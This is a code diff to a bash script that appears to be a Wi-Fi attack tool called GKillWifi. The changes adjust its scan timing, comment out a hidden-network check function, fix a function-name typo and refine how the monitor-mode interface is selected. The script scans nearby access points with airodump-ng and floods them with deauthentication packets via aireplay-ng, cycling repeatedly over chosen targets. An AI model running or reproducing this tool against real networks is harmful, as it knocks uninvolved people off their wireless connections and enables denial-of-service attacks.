@@ -104,6 +104,7 @@ FUNC_exit_function() {
 
 # ══ Target search ════════╗ START ╔═
 FUNC_dump() {
+    tm="15"
     timeout $tm airodump-ng --manufacturer -w ${Temp_GKillWifi}/dump --output-format csv $INFACE &> /dev/null &
     clear
     echo -e ""
@@ -125,18 +126,28 @@ FUNC_dump() {
 # ══ Target search ════════╝  END  ╚═
 
 # ══ Check dump ════════╗ START ╔═
-FUNC_check_dump() {
-    tm="30"
-    FUNC_dump
-    while read BSSID CH PW ESSID
-        do
-            if [[ -z "$ESSID" ]];
-                then
-                    iw dev ${INFACE} set channel ${CH} 2> /dev/null
-                    aireplay-ng ${INFACE} -0 7 -a ${BSSID} &> /dev/null
-            fi
-    done < ${Temp_GKillWifi}/list.txt
-}
+# FUNC_check_dump() {
+#     timeout 45 airodump-ng --manufacturer -w ${Temp_GKillWifi}/dump --output-format csv $INFACE &> /dev/null &
+#     Airodump_PID="$!"
+#     clear
+#     echo -en "${RSC}${WH}[${RD}!$WH] ${BD}${GR}Check WIFI POINT."
+#     while read BSSID CH PW ESSID
+#         do
+#             if [[ -z "$ESSID" ]];
+#                 then
+#                     iw dev ${INFACE} set channel ${CH} 2> /dev/null
+#                     aireplay-ng ${INFACE} -0 13 -a ${BSSID} &> /dev/null
+#             fi
+#     done < ${Temp_GKillWifi}/list.txt
+#     PID_search=$(ps | grep $Airodump_PID)
+#     while [[ -n "$PID_search" ]]; do
+#         echo -en "."
+#         sleep 1
+#         PID_search=$(ps | grep $Airodump_PID)
+#     done
+#     cat ${Temp_GKillWifi}/dump-01.csv | sed -n '/^.\{130\}/p' | awk -F ',' '{print $1, $4, $9, $14}' | grep -E -a -o '^[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}.*' | sort -u > ${Temp_GKillWifi}/list.txt
+#     rm ${Temp_GKillWifi}/dump-01.csv
+# }
 # ══ Check dump ════════╝  END  ╚═
 
 # ══ Target attack ════════╗ START ╔═
@@ -243,8 +254,8 @@ FUNC_select_target() {
 
 # ══ Cycle ════════╗ START ╔═
 FUNC_cycle() {
-    tm="15"
     FUNC_dump
+    # FUNC_check_dump
     clear
     if [[ "$tm" -eq "0" ]];
         then
@@ -279,7 +290,7 @@ FUNC_cycle() {
                             done < ${Temp_GKillWifi}/file_target.txt
                             TMP_ATTEMPT=$(($TMP_ATTEMPT+1))
                     done
-                    FUNC_Cycle
+                    FUNC_cycle
                 else
                     clear
                     echo -e ""
@@ -302,7 +313,7 @@ if [[ "$INFACENUM" -gt 1 ]];
         echo -e " ${NM}${CY}╚════════════════════════╝"
         echo -en " ${SVC}${NM}Enter NUM ${NM}${BD}${CY}> ${BD}${RD}"
         read NUM
-        INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' | grep $NUM | awk '{print $2}'`
+        INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' | grep "$NUM)" | awk '{print $2}'`
         clear
     else
         INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'`
